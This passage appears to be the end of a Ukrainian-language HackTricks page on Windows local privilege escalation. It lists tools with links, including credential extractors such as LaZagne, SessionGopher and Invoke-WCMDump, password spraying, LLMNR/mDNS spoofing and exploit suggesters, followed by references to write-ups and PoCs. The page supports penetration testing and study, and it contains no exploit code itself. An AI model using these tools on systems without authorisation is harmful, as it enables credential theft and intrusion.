[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевірка помилок конфігурації та конфіденційних файлів (**[**дивіться тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявлено.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевірка деяких можливих помилок конфігурації та збір інформації (**[**дивіться тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевірка помилок конфігурації**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережені дані сеансів PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявляється.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Перевірка зібраних паролів у домені**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це інструмент PowerShell для підміни ADIDNS/LLMNR/mDNS і атак man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове перерахування Windows для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей privesc (ЗАСТАРІЛИЙ, замінений на Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права адміністратора)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей privesc (потрібно скомпілювати за допомогою VisualStudio) ([**скомпільований файл**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перевіряє хост на наявність помилок конфігурації (радше інструмент для збору інформації, ніж для privesc) (потрібно скомпілювати) **(**[**скомпільований файл**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (скомпільований exe-файл доступний на github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевірка помилок конфігурації (скомпільований виконуваний файл доступний на github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих помилок конфігурації (exe-файл на основі Python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цієї публікації (для належної роботи йому не потрібен accesschk, але він може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Зчитує вивід **systeminfo** і рекомендує робочі експлойти (локальний Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Зчитує вивід **systeminfo** і рекомендує робочі експлойти (локальний Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Проєкт потрібно скомпілювати з правильною версією .NET ([дивіться тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену на хості жертви версію .NET, виконайте:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Основи підвищення привілеїв у Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Підвищення привілеїв шляхом експлуатації слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
- [3] [Підвищення привілеїв у Windows — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — практикум із локального підвищення привілеїв у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — атаки на Windows: AT — це новий black (Rob Fuller і Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Підвищення привілеїв — Windows — повний посібник з OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — підвищення привілеїв — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Посібник із підвищення привілеїв у Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Контрольний список підвищення привілеїв у Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Підвищення привілеїв у Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Методи підвищення привілеїв у Windows для пентестерів](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: фішинг через макрос Word VBA і SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 для отримання SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: витік через format string + stack BOF → VirtualAlloc ROP (RCE) і викрадення kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — полювання на Silver Fox: кішки-мишки в тінях ядра](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — вразливість файлової системи з привілейованим доступом у системі SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Інструменти тестування symbolic link — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Повернення в минуле: зловживання symbolic link у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (порт Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js Trust Falls: небезпечне розв’язання модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — розв’язання завдань із контрольного списку C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own з Microslop: об’єднання CLDFLT і race condition ядра DirectX для локального підвищення привілеїв у Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Одного I/O Ring вистачить на всіх: повноцінний примітив експлойту для читання/запису у Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Зловживання довільним видаленням файлів для підвищення привілеїв та інші корисні прийоми](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — код експлойту FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — атаки на WSUS, частина 2: CVE-2020-1013, локальне підвищення привілеїв у Windows 10 за допомогою 1-day експлойту](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: знайомство з Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC для CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — делегування Kerberos Resource Based Constrained Delegation: як зміна образу призводить до підвищення привілеїв](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — вилучення приватних SSH-ключів з агента SSH у Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — як перетворити сервери оновлень підприємства на фабрики бекдорів (0_o) — частина 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — як перетворити сервери оновлень підприємства на фабрики бекдорів (0_o) — частина 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
